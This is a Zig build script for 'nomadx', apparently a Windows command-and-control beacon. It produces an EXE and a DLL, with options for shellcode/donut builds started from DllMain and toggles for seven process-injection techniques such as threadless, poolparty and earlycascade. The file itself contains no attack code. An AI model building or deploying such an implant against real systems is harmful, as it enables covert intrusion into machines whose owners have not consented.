const std = @import("std");

pub fn build(b: *std.Build) void {
    const nx_target = b.standardTargetOptions(.{
        .default_target = .{
            .cpu_arch = .x86_64,
            .os_tag = .windows,
            .abi = .gnu,
        },
    });
    // Default to a small release build (the payload builder passes
    // --release=small explicitly); -Doptimize=Debug enables a debug build.
    const nx_optimize: std.builtin.Optimize =
        b.option(std.builtin.Optimize, "nx_optimize", "Optimization mode") orelse
        switch (b.graph.release_mode) {
            .off, .any, .small => .ReleaseSmall,
            .fast => .ReleaseFast,
            .safe => .ReleaseSafe,
        };

    const nx_options = b.addOptions();
    nx_options.addOption(
        bool,
        "dllmain_start",
        b.option(bool, "dllmain_start", "Start the beacon from DllMain (shellcode/donut builds)") orelse false,
    );
    inline for (.{ "fiber", "threadless", "kct", "poolparty", "earlycascade", "callback", "overload" }) |name| {
        nx_options.addOption(
            bool,
            "inj_" ++ name,
            b.option(bool, "inj_" ++ name, "Include the " ++ name ++ " injection technique") orelse true,
        );
    }

    const nx_exe = b.addExecutable(.{
        .name = "nomadx",
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/main.zig"),
            .target = nx_target,
            .optimize = nx_optimize,
        }),
    });
    nx_exe.subsystem = .windows;
    nx_exe.root_module.addOptions("build_options", nx_options);
    nx_exe.root_module.addCSourceFile(.{
        .file = b.path("src/beacon_shim.c"),
        .flags = &.{"-DNOMADX_EXE"},
    });
    nx_exe.root_module.link_libc = true;
    nx_exe.root_module.linkSystemLibrary("wininet", .{});
    nx_exe.root_module.linkSystemLibrary("advapi32", .{});
    nx_exe.root_module.linkSystemLibrary("iphlpapi", .{});
    nx_exe.root_module.linkSystemLibrary("user32", .{});
    nx_exe.root_module.linkSystemLibrary("netapi32", .{});
    b.installArtifact(nx_exe);

    const nx_dll = b.addLibrary(.{
        .name = "nomadx",
        .linkage = .dynamic,
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/lib.zig"),
            .target = nx_target,
            .optimize = nx_optimize,
        }),
    });
    nx_dll.root_module.addOptions("build_options", nx_options);
    nx_dll.root_module.addCSourceFile(.{ .file = b.path("src/beacon_shim.c") });
    nx_dll.root_module.link_libc = true;
    nx_dll.root_module.linkSystemLibrary("wininet", .{});
    nx_dll.root_module.linkSystemLibrary("advapi32", .{});
    nx_dll.root_module.linkSystemLibrary("iphlpapi", .{});
    nx_dll.root_module.linkSystemLibrary("user32", .{});
    nx_dll.root_module.linkSystemLibrary("netapi32", .{});
    b.installArtifact(nx_dll);

    const nx_resource = b.option([]const u8, "resource", "COFF resource object to link into EXE and DLL");
    if (nx_resource) |resource_path| {
        const resource = b.path(resource_path);
        nx_exe.root_module.addObjectFile(resource);
        nx_dll.root_module.addObjectFile(resource);
    }

    const nx_test_mod = b.createModule(.{
        .root_source_file = b.path("src/tests.zig"),
        .target = b.graph.host,
        .optimize = .Debug,
    });
    const nx_tests = b.addTest(.{ .root_module = nx_test_mod });
    const nx_run_tests = b.addRunArtifact(nx_tests);
    const nx_test_step = b.step("test", "Run Zig unit tests");
    nx_test_step.dependOn(&nx_run_tests.step);
}
